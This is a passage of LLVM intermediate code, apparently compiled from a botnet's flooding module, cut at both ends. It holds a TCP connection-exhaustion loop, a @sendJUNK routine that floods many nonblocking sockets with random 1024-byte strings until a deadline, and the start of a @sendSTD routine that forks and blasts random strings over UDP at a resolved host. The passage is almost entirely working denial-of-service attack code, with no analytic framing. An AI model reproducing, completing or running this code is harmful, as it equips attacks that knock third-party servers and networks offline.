  store i32 %49, i32* %17, align 4
  br label %50

; <label>:50:                                     ; preds = %253, %34
  %51 = load i32, i32* %17, align 4
  %52 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %53 = icmp sgt i32 %51, %52
  br i1 %53, label %54, label %254

; <label>:54:                                     ; preds = %50
  store i32 0, i32* %8, align 4
  br label %55

; <label>:55:                                     ; preds = %250, %54
  %56 = load i32, i32* %8, align 4
  %57 = load i32, i32* %7, align 4
  %58 = icmp slt i32 %56, %57
  br i1 %58, label %59, label %253

; <label>:59:                                     ; preds = %55
  %60 = load i32, i32* %8, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %61
  %63 = getelementptr inbounds %struct.state_t, %struct.state_t* %62, i32 0, i32 1
  %64 = load i8, i8* %63, align 4
  %65 = zext i8 %64 to i32
  switch i32 %65, label %249 [
    i32 0, label %66
    i32 1, label %110
    i32 2, label %195
  ]

; <label>:66:                                     ; preds = %59
  %67 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %68 = load i32, i32* %8, align 4
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %69
  %71 = getelementptr inbounds %struct.state_t, %struct.state_t* %70, i32 0, i32 0
  store i32 %67, i32* %71, align 8
  %72 = load i32, i32* %8, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %73
  %75 = getelementptr inbounds %struct.state_t, %struct.state_t* %74, i32 0, i32 0
  %76 = load i32, i32* %75, align 8
  %77 = load i32, i32* %8, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %78
  %80 = getelementptr inbounds %struct.state_t, %struct.state_t* %79, i32 0, i32 0
  %81 = load i32, i32* %80, align 8
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %81, i32 3, i8* null)
  %83 = or i32 %82, 2048
  %84 = call i32 (i32, i32, ...) @fcntl(i32 %76, i32 4, i32 %83)
  %85 = load i32, i32* %8, align 4
  %86 = sext i32 %85 to i64
  %87 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %86
  %88 = getelementptr inbounds %struct.state_t, %struct.state_t* %87, i32 0, i32 0
  %89 = load i32, i32* %88, align 8
  %90 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %91 = call i32 @connect(i32 %89, %struct.sockaddr* %90, i32 16)
  %92 = icmp ne i32 %91, -1
  br i1 %92, label %97, label %93

; <label>:93:                                     ; preds = %66
  %94 = call i32* @__errno_location() #13
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 115
  br i1 %96, label %97, label %104

; <label>:97:                                     ; preds = %93, %66
  %98 = load i32, i32* %8, align 4
  %99 = sext i32 %98 to i64
  %100 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %99
  %101 = getelementptr inbounds %struct.state_t, %struct.state_t* %100, i32 0, i32 0
  %102 = load i32, i32* %101, align 8
  %103 = call i32 @close(i32 %102)
  br label %109

; <label>:104:                                    ; preds = %93
  %105 = load i32, i32* %8, align 4
  %106 = sext i32 %105 to i64
  %107 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %106
  %108 = getelementptr inbounds %struct.state_t, %struct.state_t* %107, i32 0, i32 1
  store i8 1, i8* %108, align 4
  br label %109

; <label>:109:                                    ; preds = %104, %97
  br label %249

; <label>:110:                                    ; preds = %59
  br label %111

; <label>:111:                                    ; preds = %110
  %112 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %113 = getelementptr inbounds [16 x i64], [16 x i64]* %112, i64 0, i64 0
  %114 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %113) #2, !srcloc !4
  %115 = extractvalue { i64, i64* } %114, 0
  %116 = extractvalue { i64, i64* } %114, 1
  %117 = trunc i64 %115 to i32
  store i32 %117, i32* %18, align 4
  %118 = ptrtoint i64* %116 to i64
  %119 = trunc i64 %118 to i32
  store i32 %119, i32* %19, align 4
  br label %120

; <label>:120:                                    ; preds = %111
  br label %121

; <label>:121:                                    ; preds = %120
  %122 = load i32, i32* %8, align 4
  %123 = sext i32 %122 to i64
  %124 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %123
  %125 = getelementptr inbounds %struct.state_t, %struct.state_t* %124, i32 0, i32 0
  %126 = load i32, i32* %125, align 8
  %127 = srem i32 %126, 64
  %128 = zext i32 %127 to i64
  %129 = shl i64 1, %128
  %130 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %131 = load i32, i32* %8, align 4
  %132 = sext i32 %131 to i64
  %133 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %132
  %134 = getelementptr inbounds %struct.state_t, %struct.state_t* %133, i32 0, i32 0
  %135 = load i32, i32* %134, align 8
  %136 = sdiv i32 %135, 64
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds [16 x i64], [16 x i64]* %130, i64 0, i64 %137
  %139 = load i64, i64* %138, align 8
  %140 = or i64 %139, %129
  store i64 %140, i64* %138, align 8
  %141 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %141, align 8
  %142 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %142, align 8
  %143 = load i32, i32* %8, align 4
  %144 = sext i32 %143 to i64
  %145 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %144
  %146 = getelementptr inbounds %struct.state_t, %struct.state_t* %145, i32 0, i32 0
  %147 = load i32, i32* %146, align 8
  %148 = add nsw i32 %147, 1
  %149 = call i32 @select(i32 %148, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %149, i32* %15, align 4
  %150 = load i32, i32* %15, align 4
  %151 = icmp eq i32 %150, 1
  br i1 %151, label %152, label %179

; <label>:152:                                    ; preds = %121
  store i32 4, i32* %13, align 4
  %153 = load i32, i32* %8, align 4
  %154 = sext i32 %153 to i64
  %155 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %154
  %156 = getelementptr inbounds %struct.state_t, %struct.state_t* %155, i32 0, i32 0
  %157 = load i32, i32* %156, align 8
  %158 = bitcast i32* %14 to i8*
  %159 = call i32 @getsockopt(i32 %157, i32 1, i32 4, i8* %158, i32* %13) #2
  %160 = load i32, i32* %14, align 4
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %162, label %173

; <label>:162:                                    ; preds = %152
  %163 = load i32, i32* %8, align 4
  %164 = sext i32 %163 to i64
  %165 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %164
  %166 = getelementptr inbounds %struct.state_t, %struct.state_t* %165, i32 0, i32 0
  %167 = load i32, i32* %166, align 8
  %168 = call i32 @close(i32 %167)
  %169 = load i32, i32* %8, align 4
  %170 = sext i32 %169 to i64
  %171 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %170
  %172 = getelementptr inbounds %struct.state_t, %struct.state_t* %171, i32 0, i32 1
  store i8 0, i8* %172, align 4
  br label %178

; <label>:173:                                    ; preds = %152
  %174 = load i32, i32* %8, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %175
  %177 = getelementptr inbounds %struct.state_t, %struct.state_t* %176, i32 0, i32 1
  store i8 2, i8* %177, align 4
  br label %178

; <label>:178:                                    ; preds = %173, %162
  br label %194

; <label>:179:                                    ; preds = %121
  %180 = load i32, i32* %15, align 4
  %181 = icmp eq i32 %180, -1
  br i1 %181, label %182, label %193

; <label>:182:                                    ; preds = %179
  %183 = load i32, i32* %8, align 4
  %184 = sext i32 %183 to i64
  %185 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %184
  %186 = getelementptr inbounds %struct.state_t, %struct.state_t* %185, i32 0, i32 0
  %187 = load i32, i32* %186, align 8
  %188 = call i32 @close(i32 %187)
  %189 = load i32, i32* %8, align 4
  %190 = sext i32 %189 to i64
  %191 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %190
  %192 = getelementptr inbounds %struct.state_t, %struct.state_t* %191, i32 0, i32 1
  store i8 0, i8* %192, align 4
  br label %193

; <label>:193:                                    ; preds = %182, %179
  br label %194

; <label>:194:                                    ; preds = %193, %178
  br label %249

; <label>:195:                                    ; preds = %59
  br label %196

; <label>:196:                                    ; preds = %195
  %197 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %198 = getelementptr inbounds [16 x i64], [16 x i64]* %197, i64 0, i64 0
  %199 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %198) #2, !srcloc !5
  %200 = extractvalue { i64, i64* } %199, 0
  %201 = extractvalue { i64, i64* } %199, 1
  %202 = trunc i64 %200 to i32
  store i32 %202, i32* %20, align 4
  %203 = ptrtoint i64* %201 to i64
  %204 = trunc i64 %203 to i32
  store i32 %204, i32* %21, align 4
  br label %205

; <label>:205:                                    ; preds = %196
  br label %206

; <label>:206:                                    ; preds = %205
  %207 = load i32, i32* %8, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %208
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 8
  %212 = srem i32 %211, 64
  %213 = zext i32 %212 to i64
  %214 = shl i64 1, %213
  %215 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %216 = load i32, i32* %8, align 4
  %217 = sext i32 %216 to i64
  %218 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %217
  %219 = getelementptr inbounds %struct.state_t, %struct.state_t* %218, i32 0, i32 0
  %220 = load i32, i32* %219, align 8
  %221 = sdiv i32 %220, 64
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds [16 x i64], [16 x i64]* %215, i64 0, i64 %222
  %224 = load i64, i64* %223, align 8
  %225 = or i64 %224, %214
  store i64 %225, i64* %223, align 8
  %226 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %226, align 8
  %227 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %227, align 8
  %228 = load i32, i32* %8, align 4
  %229 = sext i32 %228 to i64
  %230 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %229
  %231 = getelementptr inbounds %struct.state_t, %struct.state_t* %230, i32 0, i32 0
  %232 = load i32, i32* %231, align 8
  %233 = add nsw i32 %232, 1
  %234 = call i32 @select(i32 %233, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.timeval* %12)
  store i32 %234, i32* %15, align 4
  %235 = load i32, i32* %15, align 4
  %236 = icmp ne i32 %235, 0
  br i1 %236, label %237, label %248

; <label>:237:                                    ; preds = %206
  %238 = load i32, i32* %8, align 4
  %239 = sext i32 %238 to i64
  %240 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %239
  %241 = getelementptr inbounds %struct.state_t, %struct.state_t* %240, i32 0, i32 0
  %242 = load i32, i32* %241, align 8
  %243 = call i32 @close(i32 %242)
  %244 = load i32, i32* %8, align 4
  %245 = sext i32 %244 to i64
  %246 = getelementptr inbounds %struct.state_t, %struct.state_t* %40, i64 %245
  %247 = getelementptr inbounds %struct.state_t, %struct.state_t* %246, i32 0, i32 1
  store i8 0, i8* %247, align 4
  br label %248

; <label>:248:                                    ; preds = %237, %206
  br label %249

; <label>:249:                                    ; preds = %248, %194, %109, %59
  br label %250

; <label>:250:                                    ; preds = %249
  %251 = load i32, i32* %8, align 4
  %252 = add nsw i32 %251, 1
  store i32 %252, i32* %8, align 4
  br label %55

; <label>:253:                                    ; preds = %55
  br label %50

; <label>:254:                                    ; preds = %50
  %255 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %255)
  br label %256

; <label>:256:                                    ; preds = %254, %33
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare i32 @time(...) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

; Function Attrs: noinline nounwind uwtable
define void @sendJUNK(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.sockaddr_in, align 4
  %10 = alloca i8*, align 8
  %11 = alloca %struct.__sigset_t, align 8
  %12 = alloca %struct.timeval, align 8
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %20 = call i32 @getdtablesize() #2
  %21 = sdiv i32 %20, 2
  store i32 %21, i32* %7, align 4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 0
  store i16 2, i16* %22, align 4
  %23 = load i32, i32* %5, align 4
  %24 = trunc i32 %23 to i16
  %25 = call zeroext i16 @htons(i16 zeroext %24) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = load i8*, i8** %4, align 8
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 2
  %29 = call i32 @getHost(i8* %27, %struct.in_addr* %28)
  %30 = icmp ne i32 %29, 0
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %3
  br label %226

; <label>:32:                                     ; preds = %3
  %33 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %9, i32 0, i32 3
  %34 = getelementptr inbounds [8 x i8], [8 x i8]* %33, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %34, i8 0, i64 8, i32 4, i1 false)
  %35 = load i32, i32* %7, align 4
  %36 = zext i32 %35 to i64
  %37 = call i8* @llvm.stacksave()
  store i8* %37, i8** %10, align 8
  %38 = alloca %struct.state_t, i64 %36, align 16
  %39 = bitcast %struct.state_t* %38 to i8*
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = mul i64 %41, 5
  call void @llvm.memset.p0i8.i64(i8* %39, i8 0, i64 %42, i32 16, i1 false)
  %43 = call noalias i8* @malloc(i64 1024) #2
  store i8* %43, i8** %16, align 8
  %44 = load i8*, i8** %16, align 8
  call void @llvm.memset.p0i8.i64(i8* %44, i8 0, i64 1024, i32 1, i1 false)
  %45 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %46 = load i32, i32* %6, align 4
  %47 = add nsw i32 %45, %46
  store i32 %47, i32* %17, align 4
  br label %48

; <label>:48:                                     ; preds = %223, %32
  %49 = load i32, i32* %17, align 4
  %50 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %51 = icmp sgt i32 %49, %50
  br i1 %51, label %52, label %224

; <label>:52:                                     ; preds = %48
  store i32 0, i32* %8, align 4
  br label %53

; <label>:53:                                     ; preds = %220, %52
  %54 = load i32, i32* %8, align 4
  %55 = load i32, i32* %7, align 4
  %56 = icmp slt i32 %54, %55
  br i1 %56, label %57, label %223

; <label>:57:                                     ; preds = %53
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %59
  %61 = getelementptr inbounds %struct.state_t, %struct.state_t* %60, i32 0, i32 1
  %62 = load i8, i8* %61, align 4
  %63 = zext i8 %62 to i32
  switch i32 %63, label %219 [
    i32 0, label %64
    i32 1, label %108
    i32 2, label %193
  ]

; <label>:64:                                     ; preds = %57
  %65 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %66 = load i32, i32* %8, align 4
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %67
  %69 = getelementptr inbounds %struct.state_t, %struct.state_t* %68, i32 0, i32 0
  store i32 %65, i32* %69, align 8
  %70 = load i32, i32* %8, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %71
  %73 = getelementptr inbounds %struct.state_t, %struct.state_t* %72, i32 0, i32 0
  %74 = load i32, i32* %73, align 8
  %75 = load i32, i32* %8, align 4
  %76 = sext i32 %75 to i64
  %77 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %76
  %78 = getelementptr inbounds %struct.state_t, %struct.state_t* %77, i32 0, i32 0
  %79 = load i32, i32* %78, align 8
  %80 = call i32 (i32, i32, ...) @fcntl(i32 %79, i32 3, i8* null)
  %81 = or i32 %80, 2048
  %82 = call i32 (i32, i32, ...) @fcntl(i32 %74, i32 4, i32 %81)
  %83 = load i32, i32* %8, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %84
  %86 = getelementptr inbounds %struct.state_t, %struct.state_t* %85, i32 0, i32 0
  %87 = load i32, i32* %86, align 8
  %88 = bitcast %struct.sockaddr_in* %9 to %struct.sockaddr*
  %89 = call i32 @connect(i32 %87, %struct.sockaddr* %88, i32 16)
  %90 = icmp ne i32 %89, -1
  br i1 %90, label %95, label %91

; <label>:91:                                     ; preds = %64
  %92 = call i32* @__errno_location() #13
  %93 = load i32, i32* %92, align 4
  %94 = icmp ne i32 %93, 115
  br i1 %94, label %95, label %102

; <label>:95:                                     ; preds = %91, %64
  %96 = load i32, i32* %8, align 4
  %97 = sext i32 %96 to i64
  %98 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %97
  %99 = getelementptr inbounds %struct.state_t, %struct.state_t* %98, i32 0, i32 0
  %100 = load i32, i32* %99, align 8
  %101 = call i32 @close(i32 %100)
  br label %107

; <label>:102:                                    ; preds = %91
  %103 = load i32, i32* %8, align 4
  %104 = sext i32 %103 to i64
  %105 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %104
  %106 = getelementptr inbounds %struct.state_t, %struct.state_t* %105, i32 0, i32 1
  store i8 1, i8* %106, align 4
  br label %107

; <label>:107:                                    ; preds = %102, %95
  br label %219

; <label>:108:                                    ; preds = %57
  br label %109

; <label>:109:                                    ; preds = %108
  %110 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %111 = getelementptr inbounds [16 x i64], [16 x i64]* %110, i64 0, i64 0
  %112 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %111) #2, !srcloc !6
  %113 = extractvalue { i64, i64* } %112, 0
  %114 = extractvalue { i64, i64* } %112, 1
  %115 = trunc i64 %113 to i32
  store i32 %115, i32* %18, align 4
  %116 = ptrtoint i64* %114 to i64
  %117 = trunc i64 %116 to i32
  store i32 %117, i32* %19, align 4
  br label %118

; <label>:118:                                    ; preds = %109
  br label %119

; <label>:119:                                    ; preds = %118
  %120 = load i32, i32* %8, align 4
  %121 = sext i32 %120 to i64
  %122 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %121
  %123 = getelementptr inbounds %struct.state_t, %struct.state_t* %122, i32 0, i32 0
  %124 = load i32, i32* %123, align 8
  %125 = srem i32 %124, 64
  %126 = zext i32 %125 to i64
  %127 = shl i64 1, %126
  %128 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %11, i32 0, i32 0
  %129 = load i32, i32* %8, align 4
  %130 = sext i32 %129 to i64
  %131 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %130
  %132 = getelementptr inbounds %struct.state_t, %struct.state_t* %131, i32 0, i32 0
  %133 = load i32, i32* %132, align 8
  %134 = sdiv i32 %133, 64
  %135 = sext i32 %134 to i64
  %136 = getelementptr inbounds [16 x i64], [16 x i64]* %128, i64 0, i64 %135
  %137 = load i64, i64* %136, align 8
  %138 = or i64 %137, %127
  store i64 %138, i64* %136, align 8
  %139 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 0
  store i64 0, i64* %139, align 8
  %140 = getelementptr inbounds %struct.timeval, %struct.timeval* %12, i32 0, i32 1
  store i64 10000, i64* %140, align 8
  %141 = load i32, i32* %8, align 4
  %142 = sext i32 %141 to i64
  %143 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %142
  %144 = getelementptr inbounds %struct.state_t, %struct.state_t* %143, i32 0, i32 0
  %145 = load i32, i32* %144, align 8
  %146 = add nsw i32 %145, 1
  %147 = call i32 @select(i32 %146, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  store i32 %147, i32* %15, align 4
  %148 = load i32, i32* %15, align 4
  %149 = icmp eq i32 %148, 1
  br i1 %149, label %150, label %177

; <label>:150:                                    ; preds = %119
  store i32 4, i32* %13, align 4
  %151 = load i32, i32* %8, align 4
  %152 = sext i32 %151 to i64
  %153 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %152
  %154 = getelementptr inbounds %struct.state_t, %struct.state_t* %153, i32 0, i32 0
  %155 = load i32, i32* %154, align 8
  %156 = bitcast i32* %14 to i8*
  %157 = call i32 @getsockopt(i32 %155, i32 1, i32 4, i8* %156, i32* %13) #2
  %158 = load i32, i32* %14, align 4
  %159 = icmp ne i32 %158, 0
  br i1 %159, label %160, label %171

; <label>:160:                                    ; preds = %150
  %161 = load i32, i32* %8, align 4
  %162 = sext i32 %161 to i64
  %163 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %162
  %164 = getelementptr inbounds %struct.state_t, %struct.state_t* %163, i32 0, i32 0
  %165 = load i32, i32* %164, align 8
  %166 = call i32 @close(i32 %165)
  %167 = load i32, i32* %8, align 4
  %168 = sext i32 %167 to i64
  %169 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %168
  %170 = getelementptr inbounds %struct.state_t, %struct.state_t* %169, i32 0, i32 1
  store i8 0, i8* %170, align 4
  br label %176

; <label>:171:                                    ; preds = %150
  %172 = load i32, i32* %8, align 4
  %173 = sext i32 %172 to i64
  %174 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %173
  %175 = getelementptr inbounds %struct.state_t, %struct.state_t* %174, i32 0, i32 1
  store i8 2, i8* %175, align 4
  br label %176

; <label>:176:                                    ; preds = %171, %160
  br label %192

; <label>:177:                                    ; preds = %119
  %178 = load i32, i32* %15, align 4
  %179 = icmp eq i32 %178, -1
  br i1 %179, label %180, label %191

; <label>:180:                                    ; preds = %177
  %181 = load i32, i32* %8, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %182
  %184 = getelementptr inbounds %struct.state_t, %struct.state_t* %183, i32 0, i32 0
  %185 = load i32, i32* %184, align 8
  %186 = call i32 @close(i32 %185)
  %187 = load i32, i32* %8, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %188
  %190 = getelementptr inbounds %struct.state_t, %struct.state_t* %189, i32 0, i32 1
  store i8 0, i8* %190, align 4
  br label %191

; <label>:191:                                    ; preds = %180, %177
  br label %192

; <label>:192:                                    ; preds = %191, %176
  br label %219

; <label>:193:                                    ; preds = %57
  %194 = load i8*, i8** %16, align 8
  call void @makeRandomStr(i8* %194, i32 1024)
  %195 = load i32, i32* %8, align 4
  %196 = sext i32 %195 to i64
  %197 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %196
  %198 = getelementptr inbounds %struct.state_t, %struct.state_t* %197, i32 0, i32 0
  %199 = load i32, i32* %198, align 8
  %200 = load i8*, i8** %16, align 8
  %201 = call i64 @send(i32 %199, i8* %200, i64 1024, i32 16384)
  %202 = icmp eq i64 %201, -1
  br i1 %202, label %203, label %218

; <label>:203:                                    ; preds = %193
  %204 = call i32* @__errno_location() #13
  %205 = load i32, i32* %204, align 4
  %206 = icmp ne i32 %205, 11
  br i1 %206, label %207, label %218

; <label>:207:                                    ; preds = %203
  %208 = load i32, i32* %8, align 4
  %209 = sext i32 %208 to i64
  %210 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %209
  %211 = getelementptr inbounds %struct.state_t, %struct.state_t* %210, i32 0, i32 0
  %212 = load i32, i32* %211, align 8
  %213 = call i32 @close(i32 %212)
  %214 = load i32, i32* %8, align 4
  %215 = sext i32 %214 to i64
  %216 = getelementptr inbounds %struct.state_t, %struct.state_t* %38, i64 %215
  %217 = getelementptr inbounds %struct.state_t, %struct.state_t* %216, i32 0, i32 1
  store i8 0, i8* %217, align 4
  br label %218

; <label>:218:                                    ; preds = %207, %203, %193
  br label %219

; <label>:219:                                    ; preds = %218, %192, %107, %57
  br label %220

; <label>:220:                                    ; preds = %219
  %221 = load i32, i32* %8, align 4
  %222 = add nsw i32 %221, 1
  store i32 %222, i32* %8, align 4
  br label %53

; <label>:223:                                    ; preds = %53
  br label %48

; <label>:224:                                    ; preds = %48
  %225 = load i8*, i8** %10, align 8
  call void @llvm.stackrestore(i8* %225)
  br label %226

; <label>:226:                                    ; preds = %224, %31
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @sendSTD(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca %struct.sockaddr_in, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca [36 x i8*], align 16
  %15 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %16 = call i32 @fork() #2
  store i32 %16, i32* %8, align 4
  %17 = load i32, i32* %8, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %22, label %19

; <label>:19:                                     ; preds = %3
  %20 = load i32, i32* %8, align 4
  %21 = icmp slt i32 %20, 1
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19, %3
  ret void

; <label>:23:                                     ; preds = %19
  %24 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %24, i32* %7, align 4
  %25 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %26 = sext i32 %25 to i64
  store i64 %26, i64* %9, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call %struct.hostent* @gethostbyname(i8* %27)
  store %struct.hostent* %28, %struct.hostent** %11, align 8
  %29 = bitcast %struct.sockaddr_in* %10 to i8*
  call void @llvm.memset.p0i8.i64(i8* %29, i8 0, i64 16, i32 4, i1 false)
  %30 = load %struct.hostent*, %struct.hostent** %11, align 8
  %31 = getelementptr inbounds %struct.hostent, %struct.hostent* %30, i32 0, i32 4
  %32 = load i8**, i8*** %31, align 8
  %33 = getelementptr inbounds i8*, i8** %32, i64 0
  %34 = load i8*, i8** %33, align 8
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 2
  %36 = bitcast %struct.in_addr* %35 to i8*
  %37 = load %struct.hostent*, %struct.hostent** %11, align 8
  %38 = getelementptr inbounds %struct.hostent, %struct.hostent* %37, i32 0, i32 3
  %39 = load i32, i32* %38, align 4
  %40 = sext i32 %39 to i64
  call void @bcopy(i8* %34, i8* %36, i64 %40) #2
  %41 = load %struct.hostent*, %struct.hostent** %11, align 8
  %42 = getelementptr inbounds %struct.hostent, %struct.hostent* %41, i32 0, i32 2
  %43 = load i32, i32* %42, align 8
  %44 = trunc i32 %43 to i16
  %45 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 0
  store i16 %44, i16* %45, align 4
  %46 = load i32, i32* %5, align 4
  %47 = trunc i32 %46 to i16
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %10, i32 0, i32 1
  store i16 %47, i16* %48, align 2
  store i32 0, i32* %12, align 4
  store i32 450, i32* %13, align 4
  br label %49

; <label>:49:                                     ; preds = %78, %23
  %50 = bitcast [36 x i8*]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %50, i8* bitcast ([36 x i8*]* @sendSTD.randstrings to i8*), i64 288, i32 16, i1 false)
  %51 = call i32 @rand() #2
  %52 = sext i32 %51 to i64
  %53 = urem i64 %52, 36
  %54 = getelementptr inbounds [36 x i8*], [36 x i8*]* %14, i64 0, i64 %53
  %55 = load i8*, i8** %54, align 8
  store i8* %55, i8** %15, align 8
  %56 = load i32, i32* %12, align 4
  %57 = icmp uge i32 %56, 50
  br i1 %57, label %58, label %78

; <label>:58:                                     ; preds = %49
  %59 = load i32, i32* %7, align 4
  %60 = load i8*, i8** %15, align 8
  %61 = load i32, i32* %13, align 4
  %62 = sext i32 %61 to i64
  %63 = call i64 @send(i32 %59, i8* %60, i64 %62, i32 0)
  %64 = load i32, i32* %7, align 4
  %65 = bitcast %struct.sockaddr_in* %10 to %struct.sockaddr*
